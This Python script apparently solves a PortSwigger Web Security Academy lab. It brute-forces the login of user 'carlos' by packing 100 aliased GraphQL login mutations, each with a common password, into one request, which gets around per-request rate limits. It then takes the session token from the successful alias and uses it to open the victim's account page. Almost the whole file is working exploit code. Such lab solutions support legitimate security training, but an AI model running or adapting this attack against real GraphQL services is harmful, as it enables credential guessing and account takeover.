import os
import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/graphql/v1'
final = sys.argv[1] + '/my-account'
session = requests.Session()
burp_json={"operationName": "login", "query": "mutation login{\r\n\r\n    bruteforce0: login(input: {\r\n        username: \"carlos\",\r\n        password: \"123456\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce1: login(input: {\r\n        username: \"carlos\",\r\n        password: \"password\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce2: login(input: {\r\n        username: \"carlos\",\r\n        password: \"12345678\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce3: login(input: {\r\n        username: \"carlos\",\r\n        password: \"qwerty\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce4: login(input: {\r\n        username: \"carlos\",\r\n        password: \"123456789\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce5: login(input: {\r\n        username: \"carlos\",\r\n        password: \"12345\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce6: login(input: {\r\n        username: \"carlos\",\r\n        password: \"1234\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce7: login(input: {\r\n        username: \"carlos\",\r\n        password: \"111111\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce8: login(input: {\r\n        username: \"carlos\",\r\n        password: \"1234567\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce9: login(input: {\r\n        username: \"carlos\",\r\n        password: \"dragon\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce10: login(input: {\r\n        username: \"carlos\",\r\n        password: \"123123\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce11: login(input: {\r\n        username: \"carlos\",\r\n        password: \"baseball\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce12: login(input: {\r\n        username: \"carlos\",\r\n        password: \"abc123\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce13: login(input: {\r\n        username: \"carlos\",\r\n        password: \"football\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce14: login(input: {\r\n        username: \"carlos\",\r\n        password: \"monkey\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce15: login(input: {\r\n        username: \"carlos\",\r\n        password: \"letmein\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce16: login(input: {\r\n        username: \"carlos\",\r\n        password: \"shadow\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce17: login(input: {\r\n        username: \"carlos\",\r\n        password: \"master\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce18: login(input: {\r\n        username: \"carlos\",\r\n        password: \"666666\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce19: login(input: {\r\n        username: \"carlos\",\r\n        password: \"qwertyuiop\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce20: login(input: {\r\n        username: \"carlos\",\r\n        password: \"123321\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce21: login(input: {\r\n        username: \"carlos\",\r\n        password: \"mustang\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce22: login(input: {\r\n        username: \"carlos\",\r\n        password: \"1234567890\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce23: login(input: {\r\n        username: \"carlos\",\r\n        password: \"michael\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce24: login(input: {\r\n        username: \"carlos\",\r\n        password: \"654321\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce25: login(input: {\r\n        username: \"carlos\",\r\n        password: \"superman\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce26: login(input: {\r\n        username: \"carlos\",\r\n        password: \"1qaz2wsx\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce27: login(input: {\r\n        username: \"carlos\",\r\n        password: \"7777777\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce28: login(input: {\r\n        username: \"carlos\",\r\n        password: \"121212\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce29: login(input: {\r\n        username: \"carlos\",\r\n        password: \"000000\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce30: login(input: {\r\n        username: \"carlos\",\r\n        password: \"qazwsx\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce31: login(input: {\r\n        username: \"carlos\",\r\n        password: \"123qwe\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce32: login(input: {\r\n        username: \"carlos\",\r\n        password: \"killer\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce33: login(input: {\r\n        username: \"carlos\",\r\n        password: \"trustno1\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce34: login(input: {\r\n        username: \"carlos\",\r\n        password: \"jordan\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce35: login(input: {\r\n        username: \"carlos\",\r\n        password: \"jennifer\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce36: login(input: {\r\n        username: \"carlos\",\r\n        password: \"zxcvbnm\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce37: login(input: {\r\n        username: \"carlos\",\r\n        password: \"asdfgh\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce38: login(input: {\r\n        username: \"carlos\",\r\n        password: \"hunter\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce39: login(input: {\r\n        username: \"carlos\",\r\n        password: \"buster\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce40: login(input: {\r\n        username: \"carlos\",\r\n        password: \"soccer\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce41: login(input: {\r\n        username: \"carlos\",\r\n        password: \"harley\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce42: login(input: {\r\n        username: \"carlos\",\r\n        password: \"batman\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce43: login(input: {\r\n        username: \"carlos\",\r\n        password: \"andrew\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce44: login(input: {\r\n        username: \"carlos\",\r\n        password: \"tigger\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce45: login(input: {\r\n        username: \"carlos\",\r\n        password: \"sunshine\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce46: login(input: {\r\n        username: \"carlos\",\r\n        password: \"iloveyou\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce47: login(input: {\r\n        username: \"carlos\",\r\n        password: \"2000\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce48: login(input: {\r\n        username: \"carlos\",\r\n        password: \"charlie\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce49: login(input: {\r\n        username: \"carlos\",\r\n        password: \"robert\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce50: login(input: {\r\n        username: \"carlos\",\r\n        password: \"thomas\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce51: login(input: {\r\n        username: \"carlos\",\r\n        password: \"hockey\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce52: login(input: {\r\n        username: \"carlos\",\r\n        password: \"ranger\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce53: login(input: {\r\n        username: \"carlos\",\r\n        password: \"daniel\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce54: login(input: {\r\n        username: \"carlos\",\r\n        password: \"starwars\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce55: login(input: {\r\n        username: \"carlos\",\r\n        password: \"klaster\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce56: login(input: {\r\n        username: \"carlos\",\r\n        password: \"112233\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce57: login(input: {\r\n        username: \"carlos\",\r\n        password: \"george\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce58: login(input: {\r\n        username: \"carlos\",\r\n        password: \"computer\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce59: login(input: {\r\n        username: \"carlos\",\r\n        password: \"michelle\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce60: login(input: {\r\n        username: \"carlos\",\r\n        password: \"jessica\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce61: login(input: {\r\n        username: \"carlos\",\r\n        password: \"pepper\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce62: login(input: {\r\n        username: \"carlos\",\r\n        password: \"1111\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce63: login(input: {\r\n        username: \"carlos\",\r\n        password: \"zxcvbn\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce64: login(input: {\r\n        username: \"carlos\",\r\n        password: \"555555\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce65: login(input: {\r\n        username: \"carlos\",\r\n        password: \"11111111\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce66: login(input: {\r\n        username: \"carlos\",\r\n        password: \"131313\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce67: login(input: {\r\n        username: \"carlos\",\r\n        password: \"freedom\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce68: login(input: {\r\n        username: \"carlos\",\r\n        password: \"777777\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce69: login(input: {\r\n        username: \"carlos\",\r\n        password: \"pass\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce70: login(input: {\r\n        username: \"carlos\",\r\n        password: \"maggie\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce71: login(input: {\r\n        username: \"carlos\",\r\n        password: \"159753\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce72: login(input: {\r\n        username: \"carlos\",\r\n        password: \"aaaaaa\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce73: login(input: {\r\n        username: \"carlos\",\r\n        password: \"ginger\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce74: login(input: {\r\n        username: \"carlos\",\r\n        password: \"princess\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce75: login(input: {\r\n        username: \"carlos\",\r\n        password: \"joshua\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce76: login(input: {\r\n        username: \"carlos\",\r\n        password: \"cheese\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce77: login(input: {\r\n        username: \"carlos\",\r\n        password: \"amanda\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce78: login(input: {\r\n        username: \"carlos\",\r\n        password: \"summer\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce79: login(input: {\r\n        username: \"carlos\",\r\n        password: \"love\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce80: login(input: {\r\n        username: \"carlos\",\r\n        password: \"ashley\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce81: login(input: {\r\n        username: \"carlos\",\r\n        password: \"nicole\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce82: login(input: {\r\n        username: \"carlos\",\r\n        password: \"chelsea\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce83: login(input: {\r\n        username: \"carlos\",\r\n        password: \"biteme\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce84: login(input: {\r\n        username: \"carlos\",\r\n        password: \"matthew\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce85: login(input: {\r\n        username: \"carlos\",\r\n        password: \"access\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce86: login(input: {\r\n        username: \"carlos\",\r\n        password: \"yankees\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce87: login(input: {\r\n        username: \"carlos\",\r\n        password: \"987654321\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce88: login(input: {\r\n        username: \"carlos\",\r\n        password: \"dallas\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce89: login(input: {\r\n        username: \"carlos\",\r\n        password: \"austin\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce90: login(input: {\r\n        username: \"carlos\",\r\n        password: \"thunder\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce91: login(input: {\r\n        username: \"carlos\",\r\n        password: \"taylor\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce92: login(input: {\r\n        username: \"carlos\",\r\n        password: \"matrix\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce93: login(input: {\r\n        username: \"carlos\",\r\n        password: \"mobilemail\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce94: login(input: {\r\n        username: \"carlos\",\r\n        password: \"mom\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce95: login(input: {\r\n        username: \"carlos\",\r\n        password: \"monitor\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce96: login(input: {\r\n        username: \"carlos\",\r\n        password: \"monitoring\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce97: login(input: {\r\n        username: \"carlos\",\r\n        password: \"montana\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce98: login(input: {\r\n        username: \"carlos\",\r\n        password: \"moon\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n\r\n    bruteforce99: login(input: {\r\n        username: \"carlos\",\r\n        password: \"moscow\"\r\n    }) {\r\n        token\r\n        success\r\n    }\r\n\r\n}\r\n", "variables": {"input": {"password": "a", "username": "a"}}}
response = session.post(burp_url, json=burp_json)
#matche = re.search(r'bruteforce(\d+)":\s*{\s*"token":\s*"[a-zA-Z0-9]+",\s*"success":\s*true', response.text)
matche = re.search(r'bruteforce\d+":\s*{\s*"token":\s*"([a-zA-Z0-9]+)",\s*"success":\s*true', response.text)
token = matche.group(1)
cookie = {'session': token}
session.get(final, cookies=cookie)
#pass_file = os.path.join(os.path.dirname(__file__), '../Portswigger_lists/password_list.txt')
#line_number = int(matche.group(1))
#password = None

#with open(pass_file, 'r') as file:
#    lines = file.readlines()
#    if 1 <= line_number <= len(lines):
#        password = lines[line_number - 1].strip()

#print(password)

#burp_json={"operationName": "login", "query": "\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }", "variables": {"input": {"password": password, "username": "carlos"}}}
#requests.post(burp_url, json=burp_json)
#print(r.text)
